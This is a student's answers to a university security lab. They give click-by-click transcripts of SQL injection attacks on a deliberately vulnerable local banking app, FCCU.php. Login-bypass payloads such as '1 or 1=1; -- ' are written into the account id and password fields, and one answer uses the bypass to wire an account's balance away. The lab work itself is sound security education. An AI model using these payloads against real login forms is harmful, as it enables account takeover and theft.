For part 3, you are required not to submit an executable exploit, but
instead a transcript of all steps required.

For example, if the task was "log on to CourseWeb", a transcript would
look like:

1. go to http://courseweb.seas.ucla.edu/
2. click LOGIN
3. In the username window, enter your username
4. in the password window, enter your password.
5. Click submit.

The transcript should include *ALL* input or actions required to
perform each task in the assignment.

Q: Show how you can log into an account without knowing any id
numbers ahead of time.

1. Go to http://localhost:8118/cgi-bin/FCCU.php
2. Enter "1 or 1=1; -- " into account id field
3. Enter anything into password field
4. Click submit

Q: Show how you can log into *every* account without knowing any
particular id numbers ahead of time. (You can use any id numbers you
discover during the attack but you can't use your "inside knowledge"
of the SQL server.)

1. Go to http://localhost:8118/cgi-bin/FCCU.php
2. Enter "1 or id > 1; -- " into account id field adjusting the 1 to a different number to target different accounts.
3. Enter anything into password field
4. Click submit

Q: Make some account (your choice) wire its total balance to the bank
with routing number "314159265" and account number "271828182845".

1. Go to http://localhost:8118/cgi-bin/FCCU.php
2. Enter "21 or id > 212; -- " into account id field
3. Enter "11' or 1 = 1; -- " into password field
4. Click submit
5. Enter entire account balance into Wire Amount field
6. Enter Routing and Account number
7. Click wire money

Q: Explain why you can't create a new account or arbitrarily update
account balances (or show that you can).

1. You can't do this because the mysqli connection that FCCU.php is using does not allow for the execution of multiple sql queries connected such as "select * from accounts;update accounts set bal = 0 where id = 211;" gives a sql error and will not be executed.

Q: Estimate how much time you spent on this lab (all 3 parts).

1. Zach took around 3 hours to complete the SQL injection part.

Fix the vulnerability in the FCCU.php application and any other tasks
in the lab manual.
